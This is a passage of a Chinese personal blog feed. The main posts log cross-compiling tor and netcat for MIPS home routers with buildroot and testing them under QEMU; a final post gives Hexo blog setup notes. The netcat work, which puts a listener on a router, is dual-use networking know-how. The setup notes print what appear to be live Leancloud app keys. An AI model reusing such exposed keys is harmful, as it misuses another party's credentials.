id="交叉编译-zlib"><a href="#交叉编译-zlib" class="headerlink" title="交叉编译 zlib"></a>交叉编译 zlib</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/zlib$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib</code></pre><p>$ make install<br>到zlib目录/root/Desktop/cross/yes/zlib/lib里面执行<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped</code></pre><p>这根本不是mips属性的,编译错了zlib<br>如果交叉编译成功的话,属性应该是有<code>MIPS32 version</code>。</p><p>重新交叉编译 zlib</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib ./configure --prefix=/root/Desktop/cross/yes/zlib</code></pre><p>$ make<br>$ make install<br>到zlib目录里面执行/root/Desktop/cross/yes/zlib/lib<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>编译成功</p><hr><h2 id="交叉编译-tor"><a href="#交叉编译-tor" class="headerlink" title="交叉编译 tor"></a>交叉编译 tor</h2><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p><code>or</code></p><pre><code>$  ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p>即:</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \</code></pre><p>错误 :</p><pre><code>checking for mipsel-linux-gcc... /mipsel-linux-gccchecking whether the C compiler works... noconfigure: error: in `/root/Desktop/9/tor-0.3.1.8&#39;:configure: error: C compiler cannot create executablesSee &#39;config.log&#39; for more details</code></pre><p>检查config.log :<br>发现: </p><pre><code>configure:3752: checking for C compiler versionconfigure:3761: /mipsel-linux-gcc --version &gt;&amp;5./configure: line 3763: /mipsel-linux-gcc: No such file or directoryconfigure:3772: $? = 127</code></pre><p>???? $MIPSEL_LINUX_PATH2 根本就没识别,<br>export 查看所有变量 发现???根本没有$MIPSEL_LINUX_PATH2。 我不是刚才编译zlib的时候才用了吗?<br>再次设置变量 </p><pre><code>export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin</code></pre><p>重新交叉编译tor<br>没错误<br>$ make 后错误:</p><pre><code>configure: WARNING: Unable to find liblzma.checking for ZSTD... noconfigure: WARNING: Unable to find libzstdsrc/ext/keccak-tiny/keccak-tiny-unrolled.c: In function &#39;xorin8&#39;:src/ext/keccak-tiny/keccak-tiny-unrolled.c:105: error: &#39;for&#39; loop initial declaration used outside C99 mode</code></pre><p>查看config.log 发现:</p><pre><code>checking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C89... (cached) none neededchecking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C99... unsupported</code></pre><p>gcc版本太低了? 不支持?难道又要重新编译buildroot?</p><p>重新编译buildroot 加上一些选项:<br>choose:</p><pre><code>Target Architecture (MIPS (little endian) or MIPSEL)  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Build/install a shared libgcc?        default)Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable MMU supportToolchain type (Buildroot toolchain)  ---&gt; [*] Use software floatinf point by default Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) supportToolchain type (Buildroot toolchain)  ---&gt; -*- Enable WCHAR supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable toolchain locale/i18n supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable &#39;program invocation name&#39; supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable C++ supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable stack protection supportGCC compiler Version --&gt; gcc 4.6.x</code></pre><p><strong>buildroot choose</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/2011-05-toolchain_choose.png" alt="buildroot choose"></p><p>设置变量 :</p><pre><code>$ export MIPSEL_LINUX_PATH3=/root/Desktop/888/buildroot-2011.05/output/host/usr/bin</code></pre><pre><code>$ ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib --disable-gcc-hardening</code></pre><p>即:</p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check \--prefix=/root/Desktop/cross/yes/tor \CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; \AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \--disable-gcc-hardening</code></pre><p>$ make 后报错:</p><pre><code>src/common/compress_lzma.c:22:18: fatal error: lzma.h: No such file or directorycompilation terminated.make[1]: *** [src/common/compress_lzma.o] Error 1</code></pre><p>难道版本问题吗?<br><code>tor-0.2.5.15</code> 版本<br><code>https://dist.torproject.org/tor-0.2.5.15.tar.gz</code><br>make 后错误:</p><pre><code>src/common/aes.c:156:20: error: field &#39;evp&#39; has incomplete typesrc/common/aes.c: In function &#39;evaluate_ctr_for_aes&#39;:src/common/aes.c:259:5: warning: implicit declaration of function &#39;AES_ctr128_encrypt&#39; [-Wimplicit-function-declaration]make[1]: *** [src/common/aes.o] Error 1</code></pre><p>这不是以前遇到的错误,不是缺少什么需要交叉编译的库,而是 每个版本不同导致错误也不同…….</p><p><code>tor-0.2.9.13</code> 版本<br><code>https://dist.torproject.org/tor-0.2.9.13.tar.gz</code></p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent2 --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib2 --disable-gcc-hardening</code></pre><p><strong>./configure</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/configure_tor.png" alt="configure"></p><p>make 报警告</p><pre><code>/root/Desktop/9/ttor-0.2.9.13/src/common/compat.c:864: warning: the use of OBSOLESCENT &#39;utime&#39; is discouraged, use `utimes&#39;/root/Desktop/cross/yes/openssl2/lib/libcrypto.a(b_sock.o): In function &#39;BIO_gethostbyname&#39;:b_sock.c:(.text+0x80): warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>make install<br>但是！！！！！！！！！！！！！！！！<br>交叉编译成功了<br>$ file tor</p><pre><code>tor: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><strong>tor</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/file_tor.png" alt="tor"></p><p>tor <code>9468 kb</code><br>压缩传到http网盘上去 tor.zip <code>3730 kb</code></p><p><code>http://www98.zippyshare.com/d/tHqb09lT/39660/tor.zip</code><br><code>http://www54.zippyshare.com/d/59vM7raQ/19523/tor.tar.gz</code></p><p>路由器上运行<code>tor</code></p><pre><code>admin@RT-AC66U: unzip tor.zip     =&gt; unzip: invalid zip magic 4F44213Cadmin@RT-AC66U:/tmp/home/root# tar zxvf tor.tar.gz    =&gt; tar: invalid gzip magic</code></pre><p>开个远程机器吧,然后 </p><pre><code>cd /tmp python -m SimpleHTTPServer mv tor /tmpwget http://ip/tor 即可.</code></pre><p><strong>running tor</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/router_tor.png" alt="running tor"></p><p>之前我怀疑传到路由器上的tor运行时需要某些库文件的,运行发现是不需要的</p><p>但是还是有segmentation fault。<br>还是要用QEMU模拟MIPS测试….</p><h2 id="qemu模拟mips运行tor"><a href="#qemu模拟mips运行tor" class="headerlink" title="qemu模拟mips运行tor"></a>qemu模拟mips运行tor</h2><p>转到Ubuntu的<br>拷贝buildroot编译成的rootfs.tar（buildroot-2011.05 /output/ images）<br>里面有个lib文件夹，将里面的链接库sudo mv * /lib/</p><p>之后直接运行TOR（qemu的安装后会自动识别MIPS类型的文件）<br>在Ubuntu中运行qemu<br><img src="/2017/12/07/交叉编译tor在路由器上使用/running_tor_in_ubuntu.png" alt="running tor"></p><p>QEMU模拟MIPS运行TOR完美运行成功！</p><p>问题来了为什么在路由器上运行失败segmentation fault呢？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Router Model : RT-AC66U&lt;br&gt;Router CPU : MIPS32&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="交叉编译" scheme="https://sp4rr0w.github.io/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    
      <category term="路由器" scheme="https://sp4rr0w.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
      <category term="tor" scheme="https://sp4rr0w.github.io/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>交叉编译netcat在路由器上使用 - 从入门到放弃再到success</title>
    <link href="https://sp4rr0w.github.io/2017/11/27/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91netcat%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8%20-%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E5%86%8D%E5%88%B0success/"/>
    <id>https://sp4rr0w.github.io/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/</id>
    <published>2017-11-28T03:25:51.000Z</published>
    <updated>2018-03-28T01:36:37.735Z</updated>
    
    <content type="html"><![CDATA[<p>Author : <a href="https://sp4rr0w.github.io">https://sp4rr0w.github.io</a><br>Time : 2017-11-27 22:25:51<br>Router Model : RT-N12<br>Router CPU : MIPS32<br><a id="more"></a></p><h2 id="1-路由器架构"><a href="#1-路由器架构" class="headerlink" title="1. 路由器架构"></a>1. 路由器架构</h2><pre><code>admin@RT-N12:/tmp/home/rootcat /proc/cpuinfosystem type             : Broadcom BCM53572 chip rev 1 pkg 8processor               : 0cpu model               : MIPS 74K V4.9BogoMIPS                : 149.91wait instruction        : nomicrosecond timers      : yestlb_entries             : 32extra interrupt vector  : nohardware watchpoint     : yesASEs implemented        : mips16 dspshadow register sets    : 1VCED exceptions         : not availableVCEI exceptions         : not availableunaligned_instructions  : 51078121dcache hits             : 2147483648dcache misses           : 0icache hits             : 2147483648icache misses           : 0instructions            : 2147483648</code></pre><h2 id="2-先编译buildroot"><a href="#2-先编译buildroot" class="headerlink" title="2. 先编译buildroot"></a>2. 先编译buildroot</h2><p>可知<code>路由器CPU</code>为 <code>MIPS</code>。由同事告知可以先编译<code>buildroot</code>生成的gcc之后再指定编译<code>netcat</code>，这样可以在路由器上运行。</p><p><code>折腾</code>之路由此开始</p><p>下载buildroot</p><ul><li><a href="https://buildroot.org/downloads/buildroot-2017.08.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2017.08.tar.gz</a></li></ul><!-- more --><p>后编译</p><pre><code>make menuconfig</code></pre><p>出现</p><pre><code>&#39;make menuconfig&#39; requires the ncurses libraries </code></pre><p>Centos 下需要安装</p><pre><code>yum install ncurses-devel -y </code></pre><p>若出现这个</p><pre><code>Your Perl installation is not complete enough; at least the followingmodules are missing:         Data::Dumper         ExtUtils::MakeMaker         Thread::Queue</code></pre><p>解决</p><pre><code>yum install &#39;perl(Data::Dumper)&#39; -y yum install &#39;perl(ExtUtils::MakeMaker)&#39; -y yum install &#39;perl(Thread::Queue)&#39; -y </code></pre><p>运行</p><pre><code>cd buildroot-2017.08make manuconfig </code></pre><p><strong>Buildroot Configuration</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Buildroot_Configuration.png" alt="Buildroot Configuration"></p><p><strong>选择 Target options</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Target_options.png" alt="Target options"></p><pre><code>Target Architecture        ---&gt;     `MIPS (little endian)` Target Architecture Variant    ---&gt;     `Generic MIPS32 ` `</code></pre><p>make 三十分钟之后ok.<br>猜测<code>MIPS (little endian)</code> ，因为尝试编译了很多次才发现的，血泪教训。而路由器使用<code>MIPS</code>编译buildroot的时候会有很多选择，各自生成的gcc也不同。如下：</p><pre><code>mips64 big endian       mips64 little endianmips64-linux-gcc        mips64el-linux-gccmips big endian         mips little endian    mips-linux-gcc          mipsel-linux-gcc    </code></pre><p>选择mips32 little endian 即会生成mipsel-linux-gcc。</p><p><strong>Toolchian 选择3.2 (里面最低内核版本)</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Toolchain.png" alt="Toolchian"></p><pre><code>Kernel Headers    ---&gt;     `Linux 3.2.x kernel headers`  `</code></pre><p>开始编译</p><pre><code>make</code></pre><p>编译完成结尾显示</p><pre><code>...../usr/bin/install -m 0644 support/misc/target-dir-warning.txt /root/Desktop/6_mipsel_little/buildroot-2017.08/output/target/THIS_IS_NOT_YOUR_ROOT_FILESYSTEM</code></pre><p>编译之后生成</p><pre><code>./buildroot-2017.08/output/host/bin/    ：    mipsel-linux-gcc    mipsel-linux-ranlib     mipsel-linux-ar    mipsel-linux-ld     mipsel-linux-strip and./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/  ：    ld-uClibc.so.0 -&gt; ld-uClibc.so.1    ld-uClibc.so.1 -&gt; ld-uClibc-1.0.26.so    ld-uClibc-1.0.26.so    libc.so.0 -&gt; libuClibc-1.0.26.so    libc.so.1 -&gt; libuClibc-1.0.26.so    libuClibc-1.0.26.so</code></pre><h2 id="3-编译netcat"><a href="#3-编译netcat" class="headerlink" title="3. 编译netcat"></a>3. 编译netcat</h2><p>下载netcat</p><pre><code>wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz</code></pre><p>编译netcat</p><pre><code>cd netcat-0.7.1./configuremake CC=/root/Desktop/buildroot-2017.08/output/host/bin/mips64el-linux-gcc</code></pre><p>不行的话就全部指定</p><pre><code>cd netcat-0.7.1 CC=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-gcc RANLIB=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ranlib AR=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ar LD=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ld STRIP=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-strip ./configure --host=mipsel-linuxmake</code></pre><p>编译之后生成</p><pre><code>cd src file ./netcat     ./netcat: ELF 32-bit LSB executable, MIPS, N32 `MIPS64` version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped./netcat     bash: ./netcat: cannot execute binary file</code></pre><p><code>telnet</code>登录路由器，使用wget 下载我的netcat（不可以传到<code>https的网络盘</code>，因为路由上的wget不支持https。例如<code>https://dropfile.to</code>或者其他，一定传http类型网站例如<code>http://s.dropcanvas.com</code>）</p><p>之后发现<code>./netcat</code> 可以运行，但是 ：</p><pre><code>admin@RT-N12:/tmp/home/root# ./netcatCmd Line : -lvvp 5555segmentation faultadmin@RT-N12:/tmp/home/root# ./netcat_mips_little -hGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  ./netcat_mips_little [options] hostname port [port] ...listen for inbound:    ./netcat_mips_little -l -p port [options] [hostname] [port] ...admin@RT-N12:/tmp/home/root# ./netcat_mips_little 192.168.19.113 5555 &lt; 1.txtsegmentation fault</code></pre><p>只有-h参数可用（心中万只草泥马飞奔而过）,不然都是<code>segmentation fault</code></p><p>无法知道错误，大神又告诉我，<code>Qemu</code>可以模拟MIPS运行netcat</p><h2 id="转到Ubuntu"><a href="#转到Ubuntu" class="headerlink" title="转到Ubuntu"></a>转到Ubuntu</h2><pre><code>sudo apt-get install qemu    ==&gt;        /usr/bin/qemu-system-i386        /usr/bin/qemu-mipsel        /usr/bin/qemu*</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /lib/ld-uClibc.so.0: No such file or directory</code></pre><p>解决（<code>ld-uClibc-1.0.26.so</code>在上面已经提到了 在<code>./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/</code>里）</p><pre><code>sudo mv ld-uClibc-1.0.26.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.26.sosudo ln -s /lib/ld-uClibc-1.0.26.so /lib/ld-uClibc.so.0</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /home/db/Desktop/netcat_mipsel_little: can&#39;t load library &#39;libc.so.0&#39;</code></pre><p>解决</p><pre><code>sudo mv libuClibc-1.0.26.so /lib/            sudo chown -R root:root /lib/libuClibc-1.0.26.sosudo ln -s /lib/libuClibc-1.0.26.so /lib/libc.so.0</code></pre><p>但是但是 运行</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little --helpGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  netcat_mipsel_little [options] hostname port [port] ...listen for inbound:    netcat_mipsel_little -l -p port [options] [hostname] [port] ...tunnel to somewhere:   netcat_mipsel_little -L hostname:port -p port [options]Mandatory arguments to long options are mandatory for short options too.Options:  -c, --close                close connection on EOF from stdin  -e, --exec=PROGRAM         program to exec after connect  -g, --gateway=LIST         source-routing hop point[s], up to 8  -G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...  -h, --help                 display this help and exit  -i, --interval=SECS        delay interval for lines sent, ports scanned  -l, --listen               listen mode, for inbound connects  -L, --tunnel=ADDRESS:PORT  forward local port to remote address.....sudo /usr/bin/qemu-mipsel netcat_mipsel_little -lvvp 555orsudo /usr/bin/qemu-mipsel netcat_mipsel_little 192.168.19.113 5555 &lt; /home/db/Desktop/netcat_mipsel_little    ==&gt;         Unsupported setsockopt level=65535 optname=128        Error: Couldn&#39;t create connection (err=-2): Protocol not available</code></pre><p><code>????????</code>  –help 没问题，其他参数就不行?</p><p><code>然后大神告诉我，可能路由器的Linux内核太低了,处理器mipsel也不支持buildroot编译内核3.2的,我看了一下是2.6.32的，而我编译的buildroot选择Linux内核是3.2，最高可选4.4。妈的 buildroot可选内核都没2.6.32，这让我怎么搞 !</code></p><p><code>Fri 24 Nov 2017 07:19:57 AM EST</code></p><p>周末玩荒野行动PC版两局都是第二，差点吃鸡….气死我了 </p><p>周一再搞 ， 发现<br>….<br><a href="https://buildroot.org/downloads/buildroot-2009.02.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2009.02.tar.gz</a><br>最低 -&gt; Linux 2.6.35.x kernel header -&gt; 无法编译</p><p>但是 ！！！！<br>这个版本</p><pre><code>https://buildroot.org/downloads/buildroot-2012.05.tar.gz</code></pre><p>最低 -&gt; <code>Linux 2.6.35.x kernel header</code> -&gt; <code>编译成功</code><br>编译之后上传路由器 成功监听端口了,其它参数皆可正常使用，不会出现 <code>segmentation fault</code>.<br><a href="http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05" target="_blank" rel="noopener">http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05</a></p><p>Nice!!!! </p><p><strong>running netcat</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/router_netcat.png" alt="running netcat"><br>(AC66U and RT-N12 一樣的CPU)</p><p>这里还有个小点，放到Ubuntu的时候 使用qemu-mipsel执行netcat 依旧无法使用，猜测qemu版本问题，<br>我这个是2.5,官网已经2.11了，但是我apt-get install qemu时说此版本是最高了……估计从官网下载编译可以运行的。</p><pre><code># sudo /usr/bin/qemu-mipsel netcat_2011_05 -l -p 555Unsupported setsockopt level=65535 optname=128Error: Couldn&#39;t setup listening socket (err=-2)</code></pre><p>卸载重装qemu</p><pre><code>sudo apt-get remove --auto-remove qemuwget https://download.qemu.org/qemu-2.10.1.tar.xztar xvJf qemu-2.10.1.tar.xzcd qemu-2.10.1./configuremake# cd qemu-2.10.1/mipsel-linux-user# mipsel-linux-user ./qemu-mipsel /home/db/Desktop/netcat_2011_05qemu: uncaught target signal 11 (Segmentation fault) - core dumped[1]    61221 segmentation fault (core dumped)  ./qemu-mipsel /home/db/Desktop/netcat_2011_05....还有错误  不管这个了</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Author : &lt;a href=&quot;https://sp4rr0w.github.io&quot;&gt;https://sp4rr0w.github.io&lt;/a&gt;&lt;br&gt;Time : 2017-11-27 22:25:51&lt;br&gt;Router Model : RT-N12&lt;br&gt;Router CPU : MIPS32&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="交叉编译" scheme="https://sp4rr0w.github.io/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    
      <category term="netcat" scheme="https://sp4rr0w.github.io/tags/netcat/"/>
    
      <category term="路由器" scheme="https://sp4rr0w.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>重新出发</title>
    <link href="https://sp4rr0w.github.io/2017/11/26/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/"/>
    <id>https://sp4rr0w.github.io/2017/11/26/重新出发/</id>
    <published>2017-11-26T05:00:00.000Z</published>
    <updated>2018-03-28T01:36:02.713Z</updated>
    
    <content type="html"><![CDATA[<p><strong>好久不写博客了，CSDN都1年半没更新啦。</strong><br><a id="more"></a></p><blockquote><p><strong>BLOG</strong> </p><ul><li><strong>Github  : <a href="https://github.com/sp4rr0w" target="_blank" rel="noopener">https://github.com/sp4rr0w</a></strong></li><li><strong>CSDN    : <a href="http://blog.csdn.net/clownstar" target="_blank" rel="noopener">http://blog.csdn.net/clownstar</a></strong></li></ul></blockquote><p><strong>博客重启,就在此刻</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;好久不写博客了，CSDN都1年半没更新啦。&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="https://sp4rr0w.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>Blog Install</title>
    <link href="https://sp4rr0w.github.io/2017/11/25/Blog%20Install/"/>
    <id>https://sp4rr0w.github.io/2017/11/25/Blog Install/</id>
    <published>2017-11-25T05:00:00.000Z</published>
    <updated>2018-03-28T05:08:53.080Z</updated>
    
    <content type="html"><![CDATA[<p>Blog Install<br><a id="more"></a></p><pre><code>wget http://nodejs.org/dist/v9.2.0/node-v9.2.0-linux-x64.tar.gztar -zxvf node-v9.2.0-linux-x64.tar.gzsudo mv node-v9.2.0-linux-x64 /opt/sudo ln -s /opt/node-v9.2.0-linux-x64/bin/node /usr/local/bin/node        sudo ln -s /opt/node-v9.2.0-linux-x64/bin/npm /usr/local/bin/npmsudo npm install hexo -g /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo -vsudo ln -s /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo /usr/local/bin/hexohexo inithexo servercurrent folderhttps://www.jianshu.com/p/53f37196f6e7sudo npm install hexo-deployer-git --savesudo npm install hexo-generator-feed --savesudo npm install hexo-generator-sitemap --savesudo npm install hexo-generator-search --savesudo npm install hexo-front-matter-excerpt --savesudo npm install hexo-git-backup --savesudo npm install shelljs --save_config.yml.deploy:  type: git  repo: git@github.com:Sp4rr0w/sp4rr0w.github.io.git  branch: masterbackup:    type: git    theme: landscape    repository:       github: git@github.com:Sp4rr0w/blog-backup.git,mastergit config --global user.name &quot;sp4rr0w&quot;git config --global user.email &quot;zbxzyzbx@163.com&quot;ssh-keygen -t rsa -C &quot;zbxzyzbx@163.com&quot; ==&gt; id_rsa.pub   profile -&gt; Settings -&gt; SSH and GPG Keys -&gt; Add new SSH keyhexo clean &amp;&amp; hexo g &amp;&amp; hexo dgit clone https://github.com/viosey/hexo-theme-material.git themes/material安装访客量http://ibruce.info/2015/04/04/busuanzi/#more没加载出来前就显示旋转效果 ：打开themes/你的主题/layout/_partial/footer.ejs添加&lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css&quot;&gt;Total &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt; views.您是Sparrow博客的第&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;个小伙伴.换个简洁评论valinehttps://github.com/litten/hexo-theme-yilia/pull/646_config.yml : valine:  appid:  #Leancloud应用的appId   XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz appkey:  #Leancloud应用的appKey   aaBboz6UbNeJnPowxKNNDTm2https://material.viosey.com/docslanguage: zh-CNsearch:    path: search.xml    field: allbaidu_site_id: categories:- 技术相关tags:- PS3- Gamespages:    标签云:         link: &quot;/tags&quot;            icon: person            divider: falsehexo-front-matter-excerpt 这个插件，默认是读取 &lt;!-- more --&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blog Install&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="https://sp4rr0w.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
</feed>
